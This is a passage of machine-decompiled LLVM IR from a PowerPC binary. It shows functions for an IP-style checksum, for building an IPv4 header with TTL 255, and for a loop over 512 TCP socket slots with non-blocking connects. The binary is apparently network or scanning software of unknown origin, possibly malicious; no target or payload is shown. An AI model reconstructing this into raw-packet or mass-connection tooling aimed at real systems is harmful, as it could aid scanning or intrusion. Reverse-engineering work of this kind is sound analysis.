  %stack_var_-20.07 = phi i32 [ %v1_10008804, %dec_label_pc_100087c8 ], [ %arg2, %dec_label_pc_100087a0 ]
  %stack_var_-16.06 = phi i32 [ %v5_100087e8, %dec_label_pc_100087c8 ], [ 0, %dec_label_pc_100087a0 ]
  %stack_var_-12.05 = phi i32 [ %v2_100087e4, %dec_label_pc_100087c8 ], [ 0, %dec_label_pc_100087a0 ]
  %v4_100087c8 = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_100087cc = load i16, i16* %stack_var_-24.08, align 2
  %v3_100087cc = zext i16 %v2_100087cc to i32
  %v2_100087e4 = add i32 %v3_100087cc, %stack_var_-12.05
  %v3_100087e4 = icmp ult i32 %v2_100087e4, %stack_var_-12.05
  %v4_100087e8 = zext i1 %v3_100087e4 to i32
  %v5_100087e8 = add i32 %v4_100087e8, %stack_var_-16.06
  %v1_100087f8 = add i32 %v4_100087c8, 2
  %v5_100087fc = inttoptr i32 %v1_100087f8 to i16*
  %v1_10008804 = add nsw i32 %stack_var_-20.07, -2
  %v2_10008810 = icmp sgt i32 %v1_10008804, 1
  br i1 %v2_10008810, label %dec_label_pc_100087c8, label %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge

dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge: ; preds = %dec_label_pc_100087c8
  %v3_10008810.le = icmp eq i32 %v1_10008804, 1
  br i1 %v3_10008810.le, label %dec_label_pc_10008824, label %dec_label_pc_10008890.preheader

dec_label_pc_10008818:                            ; preds = %dec_label_pc_100087a0
  %v3_100088104 = icmp eq i32 %arg2, 1
  br i1 %v3_100088104, label %dec_label_pc_10008824, label %dec_label_pc_10008890.preheader

dec_label_pc_10008824:                            ; preds = %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge, %dec_label_pc_10008818
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_100087fc, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ %arg1, %dec_label_pc_10008818 ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_100087e8, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_100087e4, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ]
  %v1_10008828 = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_10008828 = load i8, i8* %v1_10008828, align 1
  %v3_10008828 = zext i8 %v2_10008828 to i32
  %v2_10008840 = add i32 %v3_10008828, %stack_var_-12.0.lcssa18
  %v3_10008840 = icmp ult i32 %v2_10008840, %stack_var_-12.0.lcssa18
  %v4_10008844 = zext i1 %v3_10008840 to i32
  %v5_10008844 = add i32 %v4_10008844, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10008890.preheader

dec_label_pc_10008890.preheader:                  ; preds = %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge, %dec_label_pc_10008824, %dec_label_pc_10008818
  %stack_var_-12.1.ph = phi i32 [ %v2_100087e4, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ], [ %v2_10008840, %dec_label_pc_10008824 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100087e8, %dec_label_pc_1000880c.dec_label_pc_10008818_crit_edge ], [ 0, %dec_label_pc_10008818 ], [ %v5_10008844, %dec_label_pc_10008824 ]
  %v1_1000889429 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_1000889c30 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100088a031 = or i32 %v1_1000889429, %v1_1000889c30
  %v1_100088a832 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_100088b033 = or i32 %v2_100088a031, %v1_100088a832
  %v3_100088b434 = icmp eq i32 %v2_100088b033, 0
  br i1 %v3_100088b434, label %dec_label_pc_100088bc, label %dec_label_pc_10008854

dec_label_pc_10008854:                            ; preds = %dec_label_pc_10008890.preheader, %dec_label_pc_10008854
  %v1_100088a837 = phi i32 [ %v1_100088a8, %dec_label_pc_10008854 ], [ %v1_100088a832, %dec_label_pc_10008890.preheader ]
  %v2_100088a036 = phi i32 [ %v2_100088a0, %dec_label_pc_10008854 ], [ %v2_100088a031, %dec_label_pc_10008890.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10008880, %dec_label_pc_10008854 ], [ %stack_var_-12.1.ph, %dec_label_pc_10008890.preheader ]
  %v1_10008860 = urem i32 %stack_var_-12.135, 65536
  %v2_10008880 = add i32 %v2_100088a036, %v1_10008860
  %v3_10008880 = icmp ult i32 %v2_10008880, %v1_10008860
  %v4_10008884 = zext i1 %v3_10008880 to i32
  %v5_10008884 = add nuw nsw i32 %v4_10008884, %v1_100088a837
  %v1_10008894 = mul i32 %v5_10008884, 65536
  %v1_1000889c = udiv i32 %v2_10008880, 65536
  %v2_100088a0 = or i32 %v1_10008894, %v1_1000889c
  %v1_100088a8 = udiv i32 %v5_10008884, 65536
  %v2_100088b0 = or i32 %v2_100088a0, %v1_100088a8
  %v3_100088b4 = icmp eq i32 %v2_100088b0, 0
  br i1 %v3_100088b4, label %dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge, label %dec_label_pc_10008854

dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge: ; preds = %dec_label_pc_10008854
  br label %dec_label_pc_100088bc

dec_label_pc_100088bc:                            ; preds = %dec_label_pc_10008890.dec_label_pc_100088bc_crit_edge, %dec_label_pc_10008890.preheader
  %v4_100088bc = zext i16 %tmp21 to i32
  %v1_100088c8 = xor i32 %v4_100088bc, 65535
  ret i32 %v1_100088c8

; uselistorder directives
  uselistorder i32 %v2_100088a0, { 1, 0 }
  uselistorder i32 %v5_10008884, { 1, 0 }
  uselistorder i32 %v2_10008880, { 0, 2, 1 }
  uselistorder i32 %v1_100088a832, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10008804, { 0, 2, 1 }
  uselistorder i32 %v2_100087e4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008854, { 1, 0 }
  uselistorder label %dec_label_pc_10008890.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008824, { 1, 0 }
  uselistorder label %dec_label_pc_100087c8, { 1, 0 }
}

define i32 @function_100088e0(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100088e0:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100088e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100088e0, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_1000890c = add i32 %arg1, 12
  %v2_1000890c = inttoptr i32 %v1_1000890c to i32*
  %v3_1000890c = load i32, i32* %v2_1000890c, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10008918 = add i32 %arg1, 16
  %v2_10008918 = inttoptr i32 %v1_10008918 to i32*
  %v3_10008918 = load i32, i32* %v2_10008918, align 4
  store i32 20, i32* @r3, align 4
  %v1_10008934 = call i32 @function_1000e698(i32 20)
  store i32 268470612, i32* @lr, align 4
  %v1_10008950 = call i32 @function_1000ef60(i32 32)
  store i32 %v1_10008950, i32* %r11.global-to-local, align 4
  store i32 %v3_10008918, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10008970 = inttoptr i32 %v1_10008950 to i32*
  store i32 %v3_1000890c, i32* %v2_10008970, align 4
  %v0_10008974 = load i32, i32* %r10.global-to-local, align 4
  %v1_10008974 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008974 = add i32 %v1_10008974, 4
  %v3_10008974 = inttoptr i32 %v2_10008974 to i32*
  store i32 %v0_10008974, i32* %v3_10008974, align 4
  %v0_10008978 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008978 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008978 = add i32 %v1_10008978, 8
  %v3_10008978 = inttoptr i32 %v2_10008978 to i32*
  store i32 %v0_10008978, i32* %v3_10008978, align 4
  %v1_10008980 = add i32 %v1_10008950, 12
  store i32 %v1_10008980, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10008988 = load i32, i32* %arg2, align 4
  %v1_1000898c = add i32 %tmp, 4
  %v2_1000898c = inttoptr i32 %v1_1000898c to i32*
  %v3_1000898c = load i32, i32* %v2_1000898c, align 4
  store i32 %v3_1000898c, i32* %r10.global-to-local, align 4
  %v1_10008990 = add i32 %tmp, 8
  %v2_10008990 = inttoptr i32 %v1_10008990 to i32*
  %v3_10008990 = load i32, i32* %v2_10008990, align 4
  %v1_10008994 = add i32 %tmp, 12
  %v2_10008994 = inttoptr i32 %v1_10008994 to i32*
  %v3_10008994 = load i32, i32* %v2_10008994, align 4
  %v2_10008998 = inttoptr i32 %v1_10008980 to i32*
  store i32 %v2_10008988, i32* %v2_10008998, align 4
  %v0_1000899c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000899c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000899c = add i32 %v1_1000899c, 4
  %v3_1000899c = inttoptr i32 %v2_1000899c to i32*
  store i32 %v0_1000899c, i32* %v3_1000899c, align 4
  %v1_100089a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100089a0 = add i32 %v1_100089a0, 8
  %v3_100089a0 = inttoptr i32 %v2_100089a0 to i32*
  store i32 %v3_10008990, i32* %v3_100089a0, align 4
  %v1_100089a4 = load i32, i32* %r11.global-to-local, align 4
  %v2_100089a4 = add i32 %v1_100089a4, 12
  %v3_100089a4 = inttoptr i32 %v2_100089a4 to i32*
  store i32 %v3_10008994, i32* %v3_100089a4, align 4
  %v1_100089a8 = add i32 %tmp, 16
  %v2_100089a8 = inttoptr i32 %v1_100089a8 to i32*
  %v3_100089a8 = load i32, i32* %v2_100089a8, align 4
  %v1_100089ac = load i32, i32* %r11.global-to-local, align 4
  %v2_100089ac = add i32 %v1_100089ac, 16
  %v3_100089ac = inttoptr i32 %v2_100089ac to i32*
  store i32 %v3_100089a8, i32* %v3_100089ac, align 4
  %v5_100089b8 = inttoptr i32 %v1_10008950 to i16*
  %v6_100089b8 = call i32 @function_100087a0(i16* %v5_100089b8, i32 32, i32 %v3_10008994, i32 %v3_10008990, i32 %tmp)
  %sext = mul i32 %v6_100089b8, 65536
  %v1_100089bc = sdiv i32 %sext, 65536
  store i32 268470732, i32* @lr, align 4
  %v1_100089c8 = call i32 @function_1000f0b8(i32 %v1_10008950)
  %v1_100089d0 = urem i32 %v1_100089bc, 65536
  %v2_100089d8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_100089d8, i32* %r11.global-to-local, align 4
  ret i32 %v1_100089d0

; uselistorder directives
  uselistorder i32 %v1_10008950, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @function_100089f0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100089f0:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10008a28 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10008a28, i32* %arg1, align 4
  %v1_10008a3c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10008a3c, i32* %arg1, align 4
  %v3_10008a4c = add i32 %tmp1, 1
  %v4_10008a4c = inttoptr i32 %v3_10008a4c to i8*
  store i8 0, i8* %v4_10008a4c, align 1
  %fold = add i32 %arg5, 20
  %v1_10008a64 = trunc i32 %fold to i16
  %v3_10008a64 = add i32 %tmp1, 2
  %v4_10008a64 = inttoptr i32 %v3_10008a64 to i16*
  store i16 %v1_10008a64, i16* %v4_10008a64, align 2
  %v0_10008a68 = call i32 @function_10000468()
  %v1_10008a78 = trunc i32 %v0_10008a68 to i16
  %v3_10008a78 = add i32 %tmp1, 4
  %v4_10008a78 = inttoptr i32 %v3_10008a78 to i16*
  store i16 %v1_10008a78, i16* %v4_10008a78, align 2
  %v3_10008a84 = add i32 %tmp1, 6
  %v4_10008a84 = inttoptr i32 %v3_10008a84 to i16*
  store i16 0, i16* %v4_10008a84, align 2
  %v3_10008a90 = add i32 %tmp1, 8
  %v4_10008a90 = inttoptr i32 %v3_10008a90 to i8*
  store i8 -1, i8* %v4_10008a90, align 1
  %v3_10008a9c = add i32 %tmp1, 9
  %v4_10008a9c = inttoptr i32 %v3_10008a9c to i8*
  store i8 %tmp, i8* %v4_10008a9c, align 1
  %v3_10008aa8 = add i32 %tmp1, 10
  %v4_10008aa8 = inttoptr i32 %v3_10008aa8 to i16*
  store i16 0, i16* %v4_10008aa8, align 2
  %v2_10008ab4 = add i32 %tmp1, 12
  %v3_10008ab4 = inttoptr i32 %v2_10008ab4 to i32*
  store i32 %arg3, i32* %v3_10008ab4, align 4
  %v2_10008ac0 = add i32 %tmp1, 16
  %v3_10008ac0 = inttoptr i32 %v2_10008ac0 to i32*
  store i32 %arg2, i32* %v3_10008ac0, align 4
  ret i32 %v0_10008a68
}

define i32 @function_10008adc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008adc:
  %v2_10008af8 = icmp sgt i32 %arg1, 2
  br i1 %v2_10008af8, label %dec_label_pc_10008b0c, label %dec_label_pc_10008b1c

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008adc
  store i32 ptrtoint (i32* @global_var_10008b14.308 to i32), i32* @lr, align 4
  %v1_10008b10 = call i32 @function_1000c2f4(i32 %arg1)
  br label %dec_label_pc_10008b1c

dec_label_pc_10008b1c:                            ; preds = %dec_label_pc_10008adc, %dec_label_pc_10008b0c
  %storemerge = phi i32 [ 0, %dec_label_pc_10008b0c ], [ 1, %dec_label_pc_10008adc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10008b1c, { 1, 0 }
}

define i32 @function_10008b3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10008b3c:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10008b3c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10008b3c, i32* %stack_var_-624, align 4
  store i32 268471152, i32* @lr, align 4
  %v1_10008b6c = call i32 @function_1000c78c(i32 0)
  %v0_10008b78 = call i32 @function_10000468()
  %v2_10008b80 = xor i32 %v1_10008b6c, %v0_10008b78
  store i32 ptrtoint (i32* @global_var_10008b8c.309 to i32), i32* @lr, align 4
  %v1_10008b88 = call i32 @function_1000f548(i32 %v2_10008b80)
  store i32 2, i32* %stack_var_-44, align 4
  store i32 23, i32* @r3, align 4
  %v1_10008b98 = call i32 @function_1000e698(i32 23)
  %v2_10008ba8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10008ba8, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-36, align 4
  store i32 268471236, i32* @lr, align 4
  %v1_10008bc0 = call i32 @function_1000ef60(i32 513)
  store i32 513, i32* %r9.global-to-local, align 4
  store i32 268471268, i32* @lr, align 4
  %v3_10008be0 = call i32 @function_1000dd4c(i32 %v1_10008bc0, i32 0, i32 513)
  %v2_10008bfc = load i32, i32* %stack_var_-624, align 4
  %v1_10008c04 = load i32, i32* @r1, align 4
  %v3_10008c04 = add i32 %v1_10008c04, -14352
  %v4_10008c04 = inttoptr i32 %v3_10008c04 to i32*
  store i32 %v2_10008bfc, i32* %v4_10008c04, align 4
  %v1_10008c14 = add i32 %v1_10008c04, -14329
  %v1_10008c18 = and i32 %v1_10008c14, -16
  store i32 %v1_10008c18, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10008c48.310 to i32), i32* @lr, align 4
  %v3_10008c44 = call i32 @function_1000dd4c(i32 %v1_10008c18, i32 0, i32 2560)
  store i32 512, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008c54:                            ; preds = %dec_label_pc_10008b3c, %dec_label_pc_10008c54
  %storemerge37 = phi i32 [ 0, %dec_label_pc_10008b3c ], [ %v1_10008cd4, %dec_label_pc_10008c54 ]
  %v1_10008c5c = mul nuw nsw i32 %storemerge37, 28
  %v2_10008c60 = add i32 %v1_10008c5c, %v1_10008c18
  store i32 %v2_10008c60, i32* %r9.global-to-local, align 4
  %v2_10008c68 = inttoptr i32 %v2_10008c60 to i32*
  store i32 0, i32* %v2_10008c68, align 4
  %v1_10008c70 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c70 = add i32 %v1_10008c70, 4
  %v3_10008c70 = inttoptr i32 %v2_10008c70 to i32*
  store i32 0, i32* %v3_10008c70, align 4
  %v1_10008c78 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c78 = add i32 %v1_10008c78, 8
  %v3_10008c78 = inttoptr i32 %v2_10008c78 to i32*
  store i32 0, i32* %v3_10008c78, align 4
  %v1_10008c80 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c80 = add i32 %v1_10008c80, 12
  %v3_10008c80 = inttoptr i32 %v2_10008c80 to i32*
  store i32 0, i32* %v3_10008c80, align 4
  %v1_10008c88 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c88 = add i32 %v1_10008c88, 16
  %v3_10008c88 = inttoptr i32 %v2_10008c88 to i32*
  store i32 0, i32* %v3_10008c88, align 4
  %v1_10008c90 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c90 = add i32 %v1_10008c90, 20
  %v3_10008c90 = inttoptr i32 %v2_10008c90 to i32*
  store i32 0, i32* %v3_10008c90, align 4
  %v1_10008c98 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008c98 = add i32 %v1_10008c98, 24
  %v3_10008c98 = inttoptr i32 %v2_10008c98 to i32*
  store i32 0, i32* %v3_10008c98, align 4
  %v3_10008cb0 = add i32 %v2_10008c60, 9
  %v4_10008cb0 = inttoptr i32 %v3_10008cb0 to i8*
  store i8 1, i8* %v4_10008cb0, align 1
  %v1_10008cc4 = add i32 %v2_10008c60, 24
  %v2_10008ccc = inttoptr i32 %v1_10008cc4 to i32*
  store i32 %v1_10008bc0, i32* %v2_10008ccc, align 4
  %v1_10008cd4 = add nuw nsw i32 %storemerge37, 1
  store i32 512, i32* %r9.global-to-local, align 4
  %v2_10008ce4 = icmp slt i32 %v1_10008cd4, 512
  br i1 %v2_10008ce4, label %dec_label_pc_10008c54, label %dec_label_pc_10008cec.preheader

dec_label_pc_10008cec.preheader:                  ; preds = %dec_label_pc_10008c54
  %v2_10008d34 = add i32 %v1_10008c18, 16
  %v2_10008e48 = or i32 %v1_10008c18, 4
  %v2_10009050 = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_10008cec

dec_label_pc_10008cec:                            ; preds = %dec_label_pc_10009cc8, %dec_label_pc_10008cec.preheader
  br label %dec_label_pc_10008cf8

dec_label_pc_10008cf8:                            ; preds = %dec_label_pc_10008cec, %dec_label_pc_10009cc8
  %storemerge45 = phi i32 [ 0, %dec_label_pc_10008cec ], [ %v1_10009ccc, %dec_label_pc_10009cc8 ]
  %v1_10008d00 = mul nuw nsw i32 %storemerge45, 28
  %v2_10008d04 = add i32 %v1_10008d00, %v1_10008c18
  %v1_10008d08 = add i32 %v2_10008d04, 16
  store i32 %v1_10008d08, i32* %r9.global-to-local, align 4
  %v1_10008d0c = inttoptr i32 %v1_10008d08 to i32*
  %v2_10008d0c = load i32, i32* %v1_10008d0c, align 4
  %v3_10008d10 = icmp eq i32 %v2_10008d0c, 0
  br i1 %v3_10008d10, label %dec_label_pc_10008d18, label %dec_label_pc_10008d40

dec_label_pc_10008d18:                            ; preds = %dec_label_pc_10008cf8
  store i32 268471588, i32* @lr, align 4
  %v1_10008d20 = call i32 @function_1000c78c(i32 0)
  %v1_10008d30 = mul i32 %storemerge45, 28
  %v1_10008d38 = add i32 %v2_10008d34, %v1_10008d30
  store i32 %v1_10008d38, i32* %r9.global-to-local, align 4
  %v2_10008d3c = inttoptr i32 %v1_10008d38 to i32*
  store i32 %v1_10008d20, i32* %v2_10008d3c, align 4
  br label %dec_label_pc_10008d40

dec_label_pc_10008d40:                            ; preds = %dec_label_pc_10008cf8, %dec_label_pc_10008d18
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008d50 = add i32 %v2_10008d04, 8
  %v2_10008d50 = inttoptr i32 %v1_10008d50 to i8*
  %v3_10008d50 = load i8, i8* %v2_10008d50, align 4
  %v2_10008d60 = icmp ugt i8 %v3_10008d50, 8
  br i1 %v2_10008d60, label %dec_label_pc_10009cc8, label %dec_label_pc_10008d68

dec_label_pc_10008d68:                            ; preds = %dec_label_pc_10008d40
  %v4_10008d50 = zext i8 %v3_10008d50 to i32
  %v1_10008d6c = mul nuw nsw i32 %v4_10008d50, 4
  %v2_10008d78 = add i32 %v1_10008d6c, ptrtoint (i32* @global_var_10018c58.311 to i32)
  store i32 %v2_10008d78, i32* %r9.global-to-local, align 4
  %v1_10008d7c = inttoptr i32 %v2_10008d78 to i32*
  %v2_10008d7c = load i32, i32* %v1_10008d7c, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_10008d88 = add i32 %v2_10008d7c, ptrtoint (i32* @global_var_10018c58.311 to i32)
  call void @__pseudo_branch(i32 %v2_10008d88)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008da4 = add i32 %v2_10008d04, 9
  %v2_10008da4 = inttoptr i32 %v1_10008da4 to i8*
  %v3_10008da4 = load i8, i8* %v2_10008da4, align 1
  %v3_10008dac = icmp eq i8 %v3_10008da4, 1
  store i32 %v1_10008c18, i32* %r9.global-to-local, align 4
  br i1 %v3_10008dac, label %dec_label_pc_10008db4, label %dec_label_pc_10008e58

dec_label_pc_10008db4:                            ; preds = %dec_label_pc_10008d68
  %v1_10008dc4 = add i32 %v2_10008d04, 24
  store i32 %v1_10008dc4, i32* %r9.global-to-local, align 4
  %v1_10008dc8 = inttoptr i32 %v1_10008dc4 to i32*
  %v2_10008dc8 = load i32, i32* %v1_10008dc8, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10008de4 = inttoptr i32 %v2_10008d04 to i32*
  store i32 0, i32* %v2_10008de4, align 4
  %v1_10008dec = load i32, i32* %r9.global-to-local, align 4
  %v2_10008dec = add i32 %v1_10008dec, 4
  %v3_10008dec = inttoptr i32 %v2_10008dec to i32*
  store i32 0, i32* %v3_10008dec, align 4
  %v1_10008df4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008df4 = add i32 %v1_10008df4, 8
  %v3_10008df4 = inttoptr i32 %v2_10008df4 to i32*
  store i32 0, i32* %v3_10008df4, align 4
  %v1_10008dfc = load i32, i32* %r9.global-to-local, align 4
  %v2_10008dfc = add i32 %v1_10008dfc, 12
  %v3_10008dfc = inttoptr i32 %v2_10008dfc to i32*
  store i32 0, i32* %v3_10008dfc, align 4
  %v1_10008e04 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e04 = add i32 %v1_10008e04, 16
  %v3_10008e04 = inttoptr i32 %v2_10008e04 to i32*
  store i32 0, i32* %v3_10008e04, align 4
  %v1_10008e0c = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e0c = add i32 %v1_10008e0c, 20
  %v3_10008e0c = inttoptr i32 %v2_10008e0c to i32*
  store i32 0, i32* %v3_10008e0c, align 4
  %v1_10008e14 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008e14 = add i32 %v1_10008e14, 24
  %v3_10008e14 = inttoptr i32 %v2_10008e14 to i32*
  store i32 0, i32* %v3_10008e14, align 4
  store i32 %v1_10008dc4, i32* %r9.global-to-local, align 4
  store i32 %v2_10008dc8, i32* %v1_10008dc8, align 4
  %v1_10008e38 = call i32 @function_100033f0(i32 %v1_10008dc4)
  %v0_10008e44 = load i32, i32* @r29, align 4
  %v1_10008e44 = mul i32 %v0_10008e44, 28
  %v1_10008e4c = add i32 %v1_10008e44, %v2_10008e48
  store i32 %v1_10008e4c, i32* %r9.global-to-local, align 4
  %v2_10008e50 = inttoptr i32 %v1_10008e4c to i32*
  store i32 %v1_10008e38, i32* %v2_10008e50, align 4
  br label %dec_label_pc_10008f50

dec_label_pc_10008e58:                            ; preds = %dec_label_pc_10008d68
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v3_10008e68 = load i8, i8* %v2_10008da4, align 1
  %v3_10008e70 = icmp eq i8 %v3_10008e68, 0
  br i1 %v3_10008e70, label %dec_label_pc_10008e78, label %dec_label_pc_10008f50

dec_label_pc_10008e78:                            ; preds = %dec_label_pc_10008e58
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008e88 = add i32 %v2_10008d04, 11
  %v2_10008e88 = inttoptr i32 %v1_10008e88 to i8*
  %v3_10008e88 = load i8, i8* %v2_10008e88, align 1
  %v1_10008e90 = add i8 %v3_10008e88, 1
  store i8 %v1_10008e90, i8* %v2_10008e88, align 1
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008eb8 = add i32 %v2_10008d04, 10
  %v2_10008eb8 = inttoptr i32 %v1_10008eb8 to i8*
  %v3_10008eb8 = load i8, i8* %v2_10008eb8, align 2
  %v1_10008ec0 = add i8 %v3_10008eb8, 1
  store i8 %v1_10008ec0, i8* %v2_10008eb8, align 2
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v3_10008ee8 = load i8, i8* %v2_10008e88, align 1
  %v3_10008ef0 = icmp eq i8 %v3_10008ee8, 14
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  br i1 %v3_10008ef0, label %dec_label_pc_10008ef8, label %dec_label_pc_10008f14

dec_label_pc_10008ef8:                            ; preds = %dec_label_pc_10008e78
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_10008f14:                            ; preds = %dec_label_pc_10008e78
  %v3_10008f24 = load i8, i8* %v2_10008eb8, align 2
  %v3_10008f2c = icmp eq i8 %v3_10008f24, 14
  br i1 %v3_10008f2c, label %dec_label_pc_10008f34, label %dec_label_pc_10008f50

dec_label_pc_10008f34:                            ; preds = %dec_label_pc_10008f14
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  store i8 1, i8* %v2_10008da4, align 1
  br label %dec_label_pc_10009cc8

dec_label_pc_10008f50:                            ; preds = %dec_label_pc_10008f14, %dec_label_pc_10008e58, %dec_label_pc_10008db4
  store i32 2, i32* %stack_var_-44, align 4
  store i32 23, i32* @r3, align 4
  %v1_10008f5c = call i32 @function_1000e698(i32 23)
  store i32 0, i32* %stack_var_-36, align 4
  %v1_10008f90 = add i32 %v2_10008d04, 4
  store i32 %v1_10008f90, i32* %r9.global-to-local, align 4
  store i32 268472240, i32* @lr, align 4
  %v3_10008fac = call i32 @function_1000ed5c(i32 2, i32 1, i32 0)
  %v1_10008fb8 = mul i32 %storemerge45, 28
  %v2_10008fbc = add i32 %v1_10008fb8, %v1_10008c18
  %v2_10008fc0 = inttoptr i32 %v2_10008fbc to i32*
  store i32 %v3_10008fac, i32* %v2_10008fc0, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v1_10008fd4 = inttoptr i32 %v2_10008d04 to i32*
  %v2_10008fd4 = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10008fd4, i32* %r9.global-to-local, align 4
  %v4_10008fdc = icmp eq i32 %v2_10008fd4, -1
  br i1 %v4_10008fdc, label %dec_label_pc_10009cc8, label %dec_label_pc_10008fe4

dec_label_pc_10008fe4:                            ; preds = %dec_label_pc_10008f50
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10008ff4 = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_10009008 = load i32, i32* %v1_10008fd4, align 4
  store i32 268472352, i32* @lr, align 4
  %v2_1000901c = call i32 @function_1000c140(i32 %v2_10009008, i32 3)
  store i32 268472380, i32* @lr, align 4
  %v2_10009038 = call i32 @function_1000c140(i32 %v2_10008ff4, i32 4)
  store i32 %v2_10008d04, i32* %r9.global-to-local, align 4
  %v2_1000904c = load i32, i32* %v1_10008fd4, align 4
  store i32 %v2_10009050, i32* %r9.global-to-local, align 4
  store i32 268472420, i32* @lr, align 4
  %v3_10009060 = call i32 @function_1000ebcc(i32 %v2_1000904c, i32 %v2_10009050, i32 16)
  store i32 %v3_10009060, i32* %r9.global-to-local, align 4
  %v4_1000906c = icmp eq i32 %v3_10009060, -1
  br i1 %v4_1000906c, label %dec_label_pc_10009074, label %dec_label_pc_100090c0

dec_label_pc_10009074:                            ; preds = %dec_label_pc_10008fe4
  %v0_10009074 = call i32 @function_1000c85c()
  store i32 %v0_10009074, i32* %r9.global-to-local, align 4
  %v1_1000907c = inttoptr i32 %v0_10009074 to i32*
